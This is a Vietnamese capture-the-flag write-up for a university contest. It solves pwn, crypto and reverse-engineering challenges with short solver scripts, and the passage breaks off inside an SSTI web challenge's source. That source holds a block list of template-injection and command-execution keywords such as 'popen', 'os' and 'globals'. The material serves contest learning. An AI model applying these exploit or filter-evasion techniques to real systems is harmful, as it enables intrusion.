---
title: "WannaGame NMLT"
description: "WannaGame NMLT"
summary: "WannaGame NMLT writeup"
categories: ["Writeup"]
tags: ["Web", "Reverse", "Pwn", "Crypto"]
#externalUrl: ""
date: 2025-01-04
draft: false
authors:
  - winky
---



Như tên, giải này của các anh trường mình tổ chức để lấy điểm môn Nhập môn lập trình trên trường. Giải có nhiều câu rất hay, mình hơi tiếc vì không giải được tất cả các câu web (do bị choke 😥) nhưng mình cũng đã được học hỏi thêm nhiều :peace:

| Category | Challenge Name | Difficulty | Score |
| -------- | -------------- | ---------- | ------|
| Pwn      | Hello pwner  | Warmup | 0 |
| Pwn     |      Guess me  | Very Easy | 248 |
| Crypto      | substitution  | Very Easy |  214 |
| Crypto      | hix  | Very Easy | 221 | 
| Crypto      | DH  | Easy | 308 |
|  Reverse | Easy Flag Checker | Easy|  217 |
|  Reverse| GiacMoTrua1  | Easy|  239 |
|  Reverse | GiacMoTrua2| Easy|  217 |
| Web | SSTI For Kids| Easy | 440 |
| Web | DOX LIST | Medium | 639 |
| Web | Art Gallery Advanced| Medium | 639 |

## Hello pwner

![image](https://hackmd.io/_uploads/By1iDZ8Lyg.png)

Bài này em đọc không kĩ yêu cầu nên em tưởng là free flag 😥 

## Guess me

![image](https://hackmd.io/_uploads/S1jTF-I8ke.png)

Đề bài cho mình một file

Sau khi dempile thì mình nhận được kết quả như sau

<details>
<summary>chal</summary>
    
```c
undefined8 main(EVP_PKEY_CTX *param_1)

{
  int iVar1;
  long in_FS_OFFSET;
  uint local_1c;
  uint local_18;
  uint local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  init(param_1);
  signal(0xe,handle_alarm);
  iVar1 = rand();
  local_14 = iVar1 % 100000000 + 1;
  local_18 = 0x1b;
  puts("Welcome to the Guessing Game!");
  printf("You have %u attempts to guess the number between 1 and %d.\n",(ulong)local_18,100000000 );
  puts("You also have 10 seconds before the game ends!\n");
  puts("Good luck!\n");
LAB_0010161d:
  do {
    if ((int)local_18 < 1) {
LAB_00101627:
      if (local_18 == 0) {
        printf("\nGame Over! The correct number was %u.\n",(ulong)local_14);
      }
      if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
        return 0;
      }
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    printf("Attempts left: %u\n",(ulong)local_18);
    printf("Enter your guess: ");
    iVar1 = __isoc99_scanf(&DAT_00102112,&local_1c);
    if ((iVar1 == 1) && (0 < (int)local_1c)) {
      if (local_14 == local_1c) {
        read_flag();
        printf("Congratulations! You guessed the correct number: %u.\n",(ulong)local_14);
        printf("Here is your flag: %s\n",flag);
        goto LAB_00101627;
      }
      if ((int)local_1c < (int)local_14) {
        puts("Too low! Try again.");
      }
      else {
        puts("Too high! Try again.");
      }
      local_18 = local_18 - 1;
      goto LAB_0010161d;
    }
    puts("Invalid input! Please enter a positive integer.");
    do {
      iVar1 = getchar();
    } while (iVar1 != 10);
  } while( true );
}
```
    
</details>

Nói qua về hàm main trên thì mình sẽ đoán số từ 1 đến 1 đến 10000000 trong 10 giây. Khi nhập vào một giá trị thì chương trình sẽ cho biết giá trị đó lớn hơn hoặc nhỏ hơn số cần tìm, nếu bằng thì sẽ trả ra flag
    
Bài này là một dạng shell code cơ bản sử dụng thuật toán tìm kiếm nhị phân nên mình xây dựng exploit script như sau
    
<details>
<summary>exploit.py</summary>
    
```python
from pwn import *
import sys
p = remote("chall.w1playground.com", 12900)
p.recvuntil("Enter your guess:")
low = 1
high = 100000000 + 1
while True:
    mid = (low + high) // 2
    print(f"Guessing {mid}...") 
    p.sendline(str(mid)) 
    response = p.recvline().decode()
    print(response)
    if "congra" in response:
        print(f"Found the number: {mid}")
        break
    elif "low" in response:
        low = mid + 1
    elif "high" in response:
        high = mid - 1 
    else:
        print("Unexpected response:", response)
        break

    attempts_line = p.recvline().decode().strip()
a = p.recvline().decode().strip()
print(a)
p.close()

```
    
</details>
    
Khi chạy thì ta có kết quả như sau : 
    
![image](https://hackmd.io/_uploads/SyFGC-ILke.png)

## subsituition	

Đề bài cho mình đoạn code python sau và một file chứa enc là V1{lxwlzozxzogf}
    
<details>
<summary>chall.py</summary>
    
```python
KEY = {
    'A': 'Q', 'B': 'W', 'C': 'E', 'D': 'R', 'E': 'T', 'F': 'Y', 'G': 'U', 'H': 'I', 'I': 'O',
    'J': 'P', 'K': 'A', 'L': 'S', 'M': 'D', 'N': 'F', 'O': 'G', 'P': 'H', 'Q': 'J', 'R': 'K',
    'S': 'L', 'T': 'Z', 'U': 'X', 'V': 'C', 'W': 'V', 'X': 'B', 'Y': 'N', 'Z': 'M',
    'a': 'q', 'b': 'w', 'c': 'e', 'd': 'r', 'e': 't', 'f': 'y', 'g': 'u', 'h': 'i', 'i': 'o',
    'j': 'p', 'k': 'a', 'l': 's', 'm': 'd', 'n': 'f', 'o': 'g', 'p': 'h', 'q': 'j', 'r': 'k',
    's': 'l', 't': 'z', 'u': 'x', 'v': 'c', 'w': 'v', 'x': 'b', 'y': 'n', 'z': 'm',
}

def hehe(data, key):
    return ''.join(key.get(char, char) for char in data)

def encrypt(plaintext):
    substituted = hehe(plaintext, KEY)
    return substituted

if __name__ == "__main__":
    plaintext = "W1{???????????????}"
    encrypted = encrypt(plaintext)
    with open("encrypted.txt", "w") as f:
        f.write(encrypted)
```
    
</details>

Nói qua về code này thì nó sẽ encrypt flag dựa vào mảng KEY nên mình sẽ duyệt từng phần tử của KEY xem giá trị nào trùng với ký tự của flag thì lấy key đó
    
<details>
<summary>exploit.py</summary>
    
```python
KEY = {
    'A': 'Q', 'B': 'W', 'C': 'E', 'D': 'R', 'E': 'T', 'F': 'Y', 'G': 'U', 'H': 'I', 'I': 'O',
    'J': 'P', 'K': 'A', 'L': 'S', 'M': 'D', 'N': 'F', 'O': 'G', 'P': 'H', 'Q': 'J', 'R': 'K',
    'S': 'L', 'T': 'Z', 'U': 'X', 'V': 'C', 'W': 'V', 'X': 'B', 'Y': 'N', 'Z': 'M',
    'a': 'q', 'b': 'w', 'c': 'e', 'd': 'r', 'e': 't', 'f': 'y', 'g': 'u', 'h': 'i', 'i': 'o',
    'j': 'p', 'k': 'a', 'l': 's', 'm': 'd', 'n': 'f', 'o': 'g', 'p': 'h', 'q': 'j', 'r': 'k',
    's': 'l', 't': 'z', 'u': 'x', 'v': 'c', 'w': 'v', 'x': 'b', 'y': 'n', 'z': 'm',
}

enc = "V1{lxwlzozxzogf}"
s = ""
for i in enc:
    flag = 0
    for j in KEY :
        if KEY[j] == i:
            s += j
            flag = 1
    if (flag == 0): s+=i

print(s)
```
    
</details>
    
![image](https://hackmd.io/_uploads/BkPPzfLIJg.png)

## hix 
    
![image](https://hackmd.io/_uploads/SJ5TPxPIJe.png)    

Đề cho ta 2 file sau
    
<details>
<summary>chall.py</summary>
    
```python
import hashlib
import random

methods = ['md5', 'sha256', 'sha3_256', 'sha3_512', 'sha3_384', 'sha1', 'sha384', 'sha3_224', 'sha512', 'sha224']

def random_encrypt(x) :
    method = random.choice(methods)
    hash_obj = hashlib.new(method)
    hash_obj.update(x.encode())
    return hash_obj.hexdigest()

def main() :
    message = open("./../private/flag.txt", "r").read()
    enc = []

    for char in message :
        x = (ord(char) + 20) % 130
        x = hashlib.sha512(str(x).encode()).hexdigest()
        x = random_encrypt(x)
        enc.append(x)

    with open('encrypted_memory.txt', 'w') as f :
        f.write("ct = " + str(enc))

if __name__ == "__main__" :
    main()
```
    
</details>
    
<details>
<summary>encrypted_memory.txt</summary>
    
```
ct = ['f189636f8eef640b55d03387864fd17efd324453cc9276be5ff6bd4da88b13fca72438daaab00830a6d14330d37c0f7bee1e7c32d5dda0541a171f66a2343dc1', '1388cafa58065fa0c04372ce57f303cc4ec9fe62', 'f6266e2849bf8b8575701814cc3f3eb5369e887db54b34e85b1e4608b4fbf5e5', '31f33ac191e818db784cf8321d70f84763db2b2e599f90cf65868eec85a10f20ae0e23aa1cd48c2f13eec355b2975089490761a291ac2a1bcf33f5fbecead431', '981e4bce5dede3faa51a936f650e2c1d64169493860c67d68a1ffbbfa32f58598e7869f3f11aefc1620ee8d3ebe4e5f5', 'f06ffaaa6290bf47d26ba2c09c28dddd8f5bcad6ac464ec17fea48040acf1214d10bc109b7c47cffddb6bccd6b61b61a9e629a8f47ab26b80593f29c8c297489', 'a7d95b3bbde885b4eaa76afc6572e18e4483351005f637fe1f5a7bc0b000fe1f', '85245de371c327440a5f343f27d6df361225806e679950bab3a5a336', 'ea1923e909de3c3c3384ad9ae7696d73', '21df20aab35967470aada32375f535d4a735789bf0789fd421f85163c4d75c6e', 'b9491ae1a9de40d30a86c00139bd7d6f496f5bf4ce013bc2d5a43a97', '03f061f60f3527b15ff31d31dcce0761', '981e4bce5dede3faa51a936f650e2c1d64169493860c67d68a1ffbbfa32f58598e7869f3f11aefc1620ee8d3ebe4e5f5', 'f2a1a7e9dd5e6363050b0cdb0579ebfebdc5e348ab538bdcf47616139351cf2b9f92cb4d14446b3ad8bf182875b81e75', '24aaafc58a2b897aed5829b2e96d73b1de7cd680d76a1143cdc8baef', '6d80d11e5f1161ef86619dcdb186852b5218d6ac224b81b63555fe73741631c36ae0bcb5b3228fbed796c22dedeed587c9d65ddb825aee4fae92b6619e7ffd8f', '6f8b39550106044625102ee0cabf9fe1393f0013388633d5742fcc7e8df7708793a96885b9d18b795a2b0d9014704b9f', 'ddf3c543be9cac44f3af078583fe5fddb64104d93308c146c23f52ff25b2a6e23606c42dc0060a4dd9b11b446759cb5de1844471eb3d6d25c43c6fcc0d8d60c4', '95f2739053cf64555b0c0662b5e2d63822433f7fcac6960de6d57efda427461a58c6e2ffac6da6f4caa9407df10cc0be', 'a1bd4e0efc7ce8bd1d63433a0baa87e3a486fbfe2729d73d1dbf7d2822d201ee8726c6d94da1f09f1a53554e440ad6041ecab545b2085dc28c6f6849f0fcea23', 'a7d95b3bbde885b4eaa76afc6572e18e4483351005f637fe1f5a7bc0b000fe1f', '2b4561a521a82af6a26dfb76078ca97ba53a720f7ee67d923a6d3a13', 'b21ed1f3d501a8a842ef1b26ed3863cf10cf8231ee23a079f749cfa322702c8e', 'd798a32b52384219f8779dccf8b2173f4b73f075cbeb4507ee83c94e', 'b863fa3492fb87edcdef766f38a508ed', '9f876db4b58c1b7e499f35cdbd533a810060a0c8250bfc5421e0f42b2715b027', '4b14748ba0f3da581ddd7ec49dac41d34ea1ee6dae90818333b11501', '85153b2a5f8dea7f5488906cb65d61e9ac0666057636ff6b356dd4d8d0fc5d20', '6b91d6259827176bcb3f312a8faca297e56c7e627235b930cf8163b3e7a5328b', 'b21ed1f3d501a8a842ef1b26ed3863cf10cf8231ee23a079f749cfa322702c8e', '4c8740f90af1055f194a4c8e1b69522da228812465eb72b82b35c927bc48bf9d', 'b248b6b2f2c9365aa9a0e9b37a8057effd29bb2f34c79ec0b40124d08986832b5d227db95cb97b176541589985762d9a', '7260f9b5d1c58d0609523114ed324f396335d940f852dba558461b34c5a53630', 'a1bd4e0efc7ce8bd1d63433a0baa87e3a486fbfe2729d73d1dbf7d2822d201ee8726c6d94da1f09f1a53554e440ad6041ecab545b2085dc28c6f6849f0fcea23', '1077caf3ed754ed8fbd49c76134906e8', 'f3565219d115ec74a85056997cc25e98e3e4912a31c858c1e45b841047698e93', '83315b8fa07a35b12e3f47ebb365268b4a4a8ef2', '64c008d6460c2b98aba616b1d0d11a06b9df564b87d3aeedda83b36aacd3d0c160465109eb06c62e86e360cf026faa27a616dbbf2bec269be9ad128af96073bb', '60bbd94b3ac3ea7149fc6cd850d72d4f1750601275832815dd9a23d4c3757d84aca29d716da5dd72a0045f15ff969925', '94327e8c8321421e72f52cd726336e824630ec7dda31b07ce83f11b8234aea7a', 'a69ef62254280226cc4223a2341c727afcd7ce4e3ffd3f2f1c57d9d3cd30659b52b1c2b56f911a7157041b5f0ff8176f', '3c904622c8d8d79c6704d50ae0175b049b3a5708705ecdce932fe426b9f46f1bd6585b8288c1d38f6301c31af5feac02', 'a3939bf491ffd9824056e249d6e355d8423855f0']
```
    
</details>
    
Tóm tắt thì mỗi chuỗi trong ct là một ký tự của flag đã được encrypt bằng một bộ mã hoá nào đó nên mình sẽ brute hết các bộ xem cái nào trùng thì ta có được ký tự đó
   
<details>
<summary>exploit.py</summary>
    
```python
import string
import hashlib
import random
ct = ['f189636f8eef640b55d03387864fd17efd324453cc9276be5ff6bd4da88b13fca72438daaab00830a6d14330d37c0f7bee1e7c32d5dda0541a171f66a2343dc1', '1388cafa58065fa0c04372ce57f303cc4ec9fe62', 'f6266e2849bf8b8575701814cc3f3eb5369e887db54b34e85b1e4608b4fbf5e5', '31f33ac191e818db784cf8321d70f84763db2b2e599f90cf65868eec85a10f20ae0e23aa1cd48c2f13eec355b2975089490761a291ac2a1bcf33f5fbecead431', '981e4bce5dede3faa51a936f650e2c1d64169493860c67d68a1ffbbfa32f58598e7869f3f11aefc1620ee8d3ebe4e5f5', 'f06ffaaa6290bf47d26ba2c09c28dddd8f5bcad6ac464ec17fea48040acf1214d10bc109b7c47cffddb6bccd6b61b61a9e629a8f47ab26b80593f29c8c297489', 'a7d95b3bbde885b4eaa76afc6572e18e4483351005f637fe1f5a7bc0b000fe1f', '85245de371c327440a5f343f27d6df361225806e679950bab3a5a336', 'ea1923e909de3c3c3384ad9ae7696d73', '21df20aab35967470aada32375f535d4a735789bf0789fd421f85163c4d75c6e', 'b9491ae1a9de40d30a86c00139bd7d6f496f5bf4ce013bc2d5a43a97', '03f061f60f3527b15ff31d31dcce0761', '981e4bce5dede3faa51a936f650e2c1d64169493860c67d68a1ffbbfa32f58598e7869f3f11aefc1620ee8d3ebe4e5f5', 'f2a1a7e9dd5e6363050b0cdb0579ebfebdc5e348ab538bdcf47616139351cf2b9f92cb4d14446b3ad8bf182875b81e75', '24aaafc58a2b897aed5829b2e96d73b1de7cd680d76a1143cdc8baef', '6d80d11e5f1161ef86619dcdb186852b5218d6ac224b81b63555fe73741631c36ae0bcb5b3228fbed796c22dedeed587c9d65ddb825aee4fae92b6619e7ffd8f', '6f8b39550106044625102ee0cabf9fe1393f0013388633d5742fcc7e8df7708793a96885b9d18b795a2b0d9014704b9f', 'ddf3c543be9cac44f3af078583fe5fddb64104d93308c146c23f52ff25b2a6e23606c42dc0060a4dd9b11b446759cb5de1844471eb3d6d25c43c6fcc0d8d60c4', '95f2739053cf64555b0c0662b5e2d63822433f7fcac6960de6d57efda427461a58c6e2ffac6da6f4caa9407df10cc0be', 'a1bd4e0efc7ce8bd1d63433a0baa87e3a486fbfe2729d73d1dbf7d2822d201ee8726c6d94da1f09f1a53554e440ad6041ecab545b2085dc28c6f6849f0fcea23', 'a7d95b3bbde885b4eaa76afc6572e18e4483351005f637fe1f5a7bc0b000fe1f', '2b4561a521a82af6a26dfb76078ca97ba53a720f7ee67d923a6d3a13', 'b21ed1f3d501a8a842ef1b26ed3863cf10cf8231ee23a079f749cfa322702c8e', 'd798a32b52384219f8779dccf8b2173f4b73f075cbeb4507ee83c94e', 'b863fa3492fb87edcdef766f38a508ed', '9f876db4b58c1b7e499f35cdbd533a810060a0c8250bfc5421e0f42b2715b027', '4b14748ba0f3da581ddd7ec49dac41d34ea1ee6dae90818333b11501', '85153b2a5f8dea7f5488906cb65d61e9ac0666057636ff6b356dd4d8d0fc5d20', '6b91d6259827176bcb3f312a8faca297e56c7e627235b930cf8163b3e7a5328b', 'b21ed1f3d501a8a842ef1b26ed3863cf10cf8231ee23a079f749cfa322702c8e', '4c8740f90af1055f194a4c8e1b69522da228812465eb72b82b35c927bc48bf9d', 'b248b6b2f2c9365aa9a0e9b37a8057effd29bb2f34c79ec0b40124d08986832b5d227db95cb97b176541589985762d9a', '7260f9b5d1c58d0609523114ed324f396335d940f852dba558461b34c5a53630', 'a1bd4e0efc7ce8bd1d63433a0baa87e3a486fbfe2729d73d1dbf7d2822d201ee8726c6d94da1f09f1a53554e440ad6041ecab545b2085dc28c6f6849f0fcea23', '1077caf3ed754ed8fbd49c76134906e8', 'f3565219d115ec74a85056997cc25e98e3e4912a31c858c1e45b841047698e93', '83315b8fa07a35b12e3f47ebb365268b4a4a8ef2', '64c008d6460c2b98aba616b1d0d11a06b9df564b87d3aeedda83b36aacd3d0c160465109eb06c62e86e360cf026faa27a616dbbf2bec269be9ad128af96073bb', '60bbd94b3ac3ea7149fc6cd850d72d4f1750601275832815dd9a23d4c3757d84aca29d716da5dd72a0045f15ff969925', '94327e8c8321421e72f52cd726336e824630ec7dda31b07ce83f11b8234aea7a', 'a69ef62254280226cc4223a2341c727afcd7ce4e3ffd3f2f1c57d9d3cd30659b52b1c2b56f911a7157041b5f0ff8176f', '3c904622c8d8d79c6704d50ae0175b049b3a5708705ecdce932fe426b9f46f1bd6585b8288c1d38f6301c31af5feac02', 'a3939bf491ffd9824056e249d6e355d8423855f0']
methods = ['md5', 'sha256', 'sha3_256', 'sha3_512', 'sha3_384', 'sha1', 'sha384', 'sha3_224', 'sha512', 'sha224']
a = ""
for i in range(32, 130):
    a += chr(i)
print(a)
def random_encrypt(x, a) :
    method = a
    hash_obj = hashlib.new(method)
    hash_obj.update(x.encode())
    return hash_obj.hexdigest()
s = ''
for i in ct : 
    for j in a : 
        for k in methods :
            b = (ord(j) + 20) % 130
            b = hashlib.sha512(str(b).encode()).hexdigest()
            b = random_encrypt(b, k)
            if (str(b) == i):
                print(j, k)
                s += j    
print(s)
```
    
</details>
    
Sau khi chạy thì ta có flag
    
![image](https://hackmd.io/_uploads/rkXqBGUIJl.png)

## DH
    
![image](https://hackmd.io/_uploads/Hk0Y_ewIyl.png)

Đề bài cho mình một file sau
    
<details>
<summary>chall.py</summary>
    
```python
from Crypto.Util.number import isPrime, long_to_bytes, getPrime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from random import randint
from hashlib import sha256


FLAG = b"W1{fake-flag}"

class DH:   

    def __init__(self):
        self.gen_params()

    def gen_params(self):
        self.r = getPrime(512)

        while True:
            self.q = getPrime(42)
            self.p = (2 * self.q * self.r) + 1
            if isPrime(self.p):
                break

        while True:
            self.h = getPrime(42)
            self.g = pow(self.h, 2 * self.r, self.p)
            if self.g != 1:
                break   

        self.a = randint(2, self.p - 2)
        self.b = randint(2, self.p - 2)

        self.A, self.B = pow(self.g, self.a, self.p), pow(self.g, self.b, self.p)
        self.ss = pow(self.A, self.b, self.p)

    def encrypt(self, flag_part):
        key = sha256(long_to_bytes(self.ss)).digest()[:16]
        cipher = AES.new(key, AES.MODE_ECB)
        ct = cipher.encrypt(pad(flag_part, 16)).hex()
        return f"encrypted = {ct}"

    def get_params(self):
        return f"p = {self.p}\ng = {self.g}\nA = {self.A}\nB = {self.B}"


def main():

    dh = DH()
    print(dh.get_params())
    print(dh.encrypt(FLAG))

if __name__ == "__main__":
    main()

p = 85013941328859365232686230728938372320812319905627686919070637645614632817039920673725615375841158719310596592903101914818137738460649589340349796188816568005092757847
g = 20033344683527080232439150682925185454003164954955126339094967675384779782733210350757021743656898625398860187361281262413493941502725149445995471514781822892886669776
A = 76548721461171533747911417838852759206858825205673491250696441734297318615226024320798706656529038703728631231084155790148283919370554345818139818854112841655270107839
B = 2103083080159597422706551446020625757109756570951674830166998494220734179439318911618156966499109201221652320384817270671579741987575328177442670242481963924501204498
encrypted = "240e7b7678aaaa0dcbe06de7c5598a1ca0be7e2ae584bc7dfd2388cdb1d4fb6a37ceb94556757afc293999cbe5a5a2dbb4071ebf6cfd4332088555f9b2de1922"
```
    

    
</details>
    
Tóm tắt thì đề sẽ sử dụng thuật toán Diffie-Hellman để encrypt flag
Đọc source thì mình thấy in ra các giá trị g, p, A, B như trong hình sau 

![image](https://www.researchgate.net/profile/Sura-Fahmy-2/publication/349609600/figure/fig1/AS:995430716428288@1614340585363/Block-diagram-of-the-Diffie-Hellman-algorithm.png)

Các bước để giải bài này bao gồm : 

Tính khoá bí mật của A hoặc B dựa vào hàm discrete_log để tính logarithm của A theo cơ số g modulo p

Tính khoá chung ss bằng cách lấy B ^ a mod p

Tạo khoá AES bằng hàm sha256

Tạo một decrypt AES để giải mã ct

Từ đó mình có exploit script sau để solve bài này

    
<details>
<summary>exploit.py</summary>
    
```python
from Crypto.Util.number import long_to_bytes
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from hashlib import sha256
from sympy.ntheory import discrete_log

p = 85013941328859365232686230728938372320812319905627686919070637645614632817039920673725615375841158719310596592903101914818137738460649589340349796188816568005092757847
g = 20033344683527080232439150682925185454003164954955126339094967675384779782733210350757021743656898625398860187361281262413493941502725149445995471514781822892886669776
A = 76548721461171533747911417838852759206858825205673491250696441734297318615226024320798706656529038703728631231084155790148283919370554345818139818854112841655270107839
B = 2103083080159597422706551446020625757109756570951674830166998494220734179439318911618156966499109201221652320384817270671579741987575328177442670242481963924501204498
encrypted = "240e7b7678aaaa0dcbe06de7c5598a1ca0be7e2ae584bc7dfd2388cdb1d4fb6a37ceb94556757afc293999cbe5a5a2dbb4071ebf6cfd4332088555f9b2de1922"
a = discrete_log(p, A, g)
ss = pow(B, a, p)
key = sha256(long_to_bytes(ss)).digest()[:16]
cipher = AES.new(key, AES.MODE_ECB)
ct_bytes = bytes.fromhex(encrypted)
decrypted = unpad(cipher.decrypt(ct_bytes), 16)
print(decrypted.decode())
```

</details>

Khi chạy thì ta thu được flag
    
![image](https://hackmd.io/_uploads/rJaUjlDUye.png)
    
## Easy Flag Checker
    
![image](https://hackmd.io/_uploads/BkWjNr8Lke.png)
    
Đề bài cho mình một file binary
    
Sau khi decompile thì mình nhận được một hàm như sau
    
![image](https://hackmd.io/_uploads/rJVL4SULye.png)
    
Tóm tắt thì hàm sẽ lấy input của mình so với biến DAT_00104020 đã được xor với 0x38 tại các địa chỉ là bội của 4

Biến DAT_00104020 có dạng như sau
    
![image](https://hackmd.io/_uploads/SkGKHB8UJl.png)

Từ đó mình có exploit script như sau 
    
```python
a = ["6f", "09", "43", "4e", "0b", "4a", "41", "67", "0b", "0c", "4b", "41", "67", "4a", "09", "5f", "50", "0f", "07", "45"]
s = ""
for i in a : 
    c = "0x" + i
    x = int(c, 16)
    b = x ^ 56
    s += chr(b)
print(s)    
```
    
![image](https://hackmd.io/_uploads/HkJZ8BLI1x.png)

Khi chạy thì ta có được flag
    
## GiacMoTrua1
    
![image](https://hackmd.io/_uploads/rkcE8BU81g.png)

Ở đây web cho mình một file pyc nên mình tiến hành decompile lại 
    
Sau khi decompile thì mình nhận được code python sau 
    
<details>
<summary>GiacMoTrua1.py</summary>
    
```python
dic = [0] * 85
dic[0] = 33
dic[1] = 35
dic[2] = 36
dic[3] = 37
dic[4] = 38
dic[5] = 40
dic[6] = 41
dic[7] = 42
dic[8] = 43
dic[9] = 44
dic[10] = 45
dic[11] = 46
dic[12] = 47
dic[13] = 48
dic[14] = 49
dic[15] = 50
dic[16] = 51
dic[17] = 52
dic[18] = 53
dic[19] = 54
dic[20] = 55
dic[21] = 56
dic[22] = 57
dic[23] = 58
dic[24] = 59
dic[25] = 60
dic[26] = 61
dic[27] = 62
dic[28] = 63
dic[29] = 64
dic[30] = 65
dic[31] = 66
dic[32] = 67
dic[33] = 68
dic[34] = 69
dic[35] = 70
dic[36] = 71
dic[37] = 72
dic[38] = 73
dic[39] = 74
dic[40] = 75
dic[41] = 76
dic[42] = 77
dic[43] = 78
dic[44] = 79
dic[45] = 80
dic[46] = 81
dic[47] = 82
dic[48] = 83
dic[49] = 84
dic[50] = 85
dic[51] = 86
dic[52] = 87
dic[53] = 88
dic[54] = 89
dic[55] = 90
dic[56] = 91
dic[57] = 97
dic[58] = 98
dic[59] = 99
dic[60] = 100
dic[61] = 101
dic[62] = 102
dic[63] = 103
dic[64] = 104
dic[65] = 105
dic[66] = 106
dic[67] = 107
dic[68] = 108
dic[69] = 109
dic[70] = 110
dic[71] = 111
dic[72] = 112
dic[73] = 113
dic[74] = 114
dic[75] = 115
dic[76] = 116
dic[77] = 117
dic[78] = 118
dic[79] = 119
dic[80] = 120
dic[81] = 121
dic[82] = 122
dic[83] = 123
dic[84] = 125
flag = input('Let me help you check your flag: ')
length = len(flag)
ans = [0] * length * 2
for i in range(length):
    ans[i] = dic[ord(flag[i]) ^ 112]


for i in range(length, length * 2):  # abcdef -> abcabc
    ans[i] = ans[i - length]


fin = ''

for i in range((23 * length + 16) % length, (23 * length + 16) % length + length):
    fin += chr(ans[i])
if fin == 'R8Abq,R&;j%R6;kiiR%hR@k6iy0Ji.[k!8R,kHR*i??':
    print('Rightttt!')
    print('Heyy you are really lovely, i promise!')
else:
    print('Think more....')
```
    
</details>
    
Nói qua thì sau khi nhập vào input chương trình sẽ tạo ra mảng ans với `ans[i] = dic[ord(flag[i]) ^ 112]` sau đó nhân đôi mảng ans lên. Tiếp tục tạo ra chuỗi fin từ vòng for sau `for i in range((23 * length + 16) % length, (23 * length + 16) % length + length): fin += chr(ans[i])` và cuối cùng so với chuỗi này `R8Abq,R&;j%R6;kiiR%hR@k6iy0Ji.[k!8R,kHR*i??`
    
Từ đó mình có ý tưởng là từ chuỗi trên tìm lại fin xong tìm mảng ans rồi tìm flag
    
Script exploit như sau
   
<details>
<summary>exploit.py</summary>
    
```python
dic = [0] * 85
dic[0] = 33
dic[1] = 35
dic[2] = 36
dic[3] = 37
dic[4] = 38
dic[5] = 40
dic[6] = 41
dic[7] = 42
dic[8] = 43
dic[9] = 44
dic[10] = 45
dic[11] = 46
dic[12] = 47
dic[13] = 48
dic[14] = 49
dic[15] = 50
dic[16] = 51
dic[17] = 52
dic[18] = 53
dic[19] = 54
dic[20] = 55
dic[21] = 56
dic[22] = 57
dic[23] = 58
dic[24] = 59
dic[25] = 60
dic[26] = 61
dic[27] = 62
dic[28] = 63
dic[29] = 64
dic[30] = 65
dic[31] = 66
dic[32] = 67
dic[33] = 68
dic[34] = 69
dic[35] = 70
dic[36] = 71
dic[37] = 72
dic[38] = 73
dic[39] = 74
dic[40] = 75
dic[41] = 76
dic[42] = 77
dic[43] = 78
dic[44] = 79
dic[45] = 80
dic[46] = 81
dic[47] = 82
dic[48] = 83
dic[49] = 84
dic[50] = 85
dic[51] = 86
dic[52] = 87
dic[53] = 88
dic[54] = 89
dic[55] = 90
dic[56] = 91
dic[57] = 97
dic[58] = 98
dic[59] = 99
dic[60] = 100
dic[61] = 101
dic[62] = 102
dic[63] = 103
dic[64] = 104
dic[65] = 105
dic[66] = 106
dic[67] = 107
dic[68] = 108
dic[69] = 109
dic[70] = 110
dic[71] = 111
dic[72] = 112
dic[73] = 113
dic[74] = 114
dic[75] = 115
dic[76] = 116
dic[77] = 117
dic[78] = 118
dic[79] = 119
dic[80] = 120
dic[81] = 121
dic[82] = 122
dic[83] = 123
dic[84] = 125

f= 'R8Abq,R&;j%R6;kiiR%hR@k6iy0Ji.[k!8R,kHR*i??'
length = len(f)
print(length)
print((23 * length + 16) % length)
print((23 * length + 16) % length + length)
ans = [0] * length * 2
for i in range(16, 59):
    ans[i] = ord(f[16-i])
print(ans)

a = ans[33:59]+ans[16:33]
a = a[::-1]

print(a)
s = ""
for i in a:
    for j in range(85):
        if (dic[j] == i):
            s+=  chr(j ^ 112)

print(s)
```
    
</details>
    
Sau khi chạy thì chúng ta có flag 
    
![image](https://hackmd.io/_uploads/rkW-5SULke.png)

    
## GiacMoTrua2
    
![image](https://hackmd.io/_uploads/Syr99r8U1g.png)

Đề bài cho ta một file binary và mình tiến hành decompile

Sau đó mình nhận được hàm sau
    
![image](https://hackmd.io/_uploads/SJB2cBUIke.png)

Có thể thấy flag được biến đổi qua nhiều giai đoạn và flag nó trông như này
    
![image](https://hackmd.io/_uploads/SJGxjr8LJl.png)

Ok thì mình chỉ việc copy những hàm này và flag này để chạy thôi
    
Script exploit : 
    
```cpp
#include<bits/stdc++.h>
using namespace std;
int main(){

    char flag[] = "W1{live_speels_a5_NoOn_4v4ry_emit!}";

      for (int local_14 = 3; local_14 < 7; local_14 = local_14 + 1) {
    if (local_14 < 9 - local_14) {
      swap(flag[local_14],flag[(9 - local_14)]);
    }
  }
  for (int local_10 = 8; local_10 < 0xe; local_10 = local_10 + 1) {
    if (local_10 < 0x15 - local_10) {
      swap(flag[local_10],flag[(0x15 - local_10)]);
    }
  }
  for (int local_c = 0x1d; local_c < 0x21; local_c = local_c + 1) {
    if (local_c < 0x3d - local_c) {
      swap(flag[local_c],flag[(0x3d - local_c)]);
    }
  }
    cout << flag;

}    
```

khi chạy thì ta có flag như sau
    
![image](https://hackmd.io/_uploads/By7UoB8U1x.png)

    
## SSTI For Kids

![image](https://hackmd.io/_uploads/B1PU_xPUke.png)
    
Đề bài cho mình một trang web mô phỏng lỗ hổng SSTI như sau
    
![image](https://hackmd.io/_uploads/SyiWnSIUJx.png)

Nhiệm vụ của mình là cat được flag thông qua lỗi này nên mình đọc source xem có gì hot
    
<details>
<summary>chal</summary>
    
```python
from flask import Flask, request, render_template_string, redirect

app = Flask(__name__)

def check_payload(payload):
    forbidden_chars = ["[", "]", "_", ".", "x", "dict", "config", "mro", "popen", "debug", "cycler", "os", "globals", "flag", "cat"]
    payload = payload.lower()
    for char in forbidden_chars:
        if char in payload:
            return True
    return False

@app.route("/")
def home():
    ssti_payload = request.args.get('ssti')

    if ssti_payload:
        if check_payload(ssti_payload):
            return render_template_string("""
            <html>
                <head>
                    <title>SSTI For Kids</title>
                    <style>
                        body {
                            font-family: Arial, sans-serif;
                            text-align: center;
                            margin-top: 50px;
                        }
                        h1 {
                            color: #ff4500;
                        }
                        p {
                            font-size: 18px;
                            color: #555;
                        }
                        a {
                            text-decoration: none;
                            color: #007bff;
                            font-size: 16px;
                            margin-top: 20px;
                            display: inline-block;
                        }
                        a:hover {
                            text-decoration: underline;
                        }
